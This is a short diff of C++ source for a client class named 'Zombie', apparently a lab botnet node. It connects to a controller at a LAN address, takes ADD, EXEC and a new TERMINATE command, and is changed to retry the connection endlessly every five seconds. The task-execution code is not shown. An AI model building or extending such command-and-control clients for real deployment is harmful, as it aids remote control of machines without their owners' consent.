@@ -19,10 +19,11 @@
 using namespace std;
 
 #define PORT 5000
-#define HOST "127.0.0.1"
+// #define HOST "127.0.0.1"
+#define HOST "192.168.1.77"
 
-enum COMMANDS { ADD, EXEC };
-string COMMANDS_TAGS [] = { "ADD", "EXEC" };
+enum COMMANDS { ADD, EXEC, TERMINATE };
+string COMMANDS_TAGS [] = { "ADD", "EXEC", "TERMINATE" };
 
 std::map<std::string, int> COMMAND_MAP = {
     {"ADD", 0},
@@ -221,6 +222,10 @@ public:
             case EXEC:
                 execute_tasks();
                 break;
+            case TERMINATE:
+                cout << "Terminating..." << endl;
+                close(sock);
+                exit(0);
             default:
                 cerr << "Unknown command" << endl;
                 break;
@@ -283,9 +288,13 @@ public:
 
 int main() {
     Zombie client;
-    if (client.connect_to_server()) {
-        client.get_tasks();
+    
+    while (!client.connect_to_server()) {
+        cerr << "Reconnection attempt failed. Retrying in 5 seconds..." << endl;
+        sleep(5);
     }
+
+    client.get_tasks();
 
     return 0;
 }
